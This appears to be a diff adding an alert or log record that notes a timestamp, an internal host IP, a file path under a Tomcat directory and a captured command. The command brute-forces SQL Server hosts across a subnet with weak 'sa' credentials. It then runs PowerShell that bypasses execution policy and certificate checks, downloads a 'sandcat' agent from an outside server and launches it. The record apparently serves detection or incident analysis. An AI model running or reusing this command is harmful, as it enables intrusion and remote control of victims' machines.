@@ -1,0 +1,9 @@
+[occurTime]
+2022-03-25 15:16:47
+2022-03-25 15:17:30
+[hostIp]
+192.168.0.155
+[pCommand]
+./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec 'cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\";[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$url=$ip+\"/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"company_code\",1234567);$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\"); $output=\"C:\Users\Public\sandcat.exe\";$wc.DownloadFile($url,$output);cmd /c start /min C:\Users\Public\sandcat.exe -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -server https://124.223.85.207:8443'
+[pFilePath]
+/usr/tomcat/apache-tomcat-8.5.76/bin/sqltool_amd64_upx
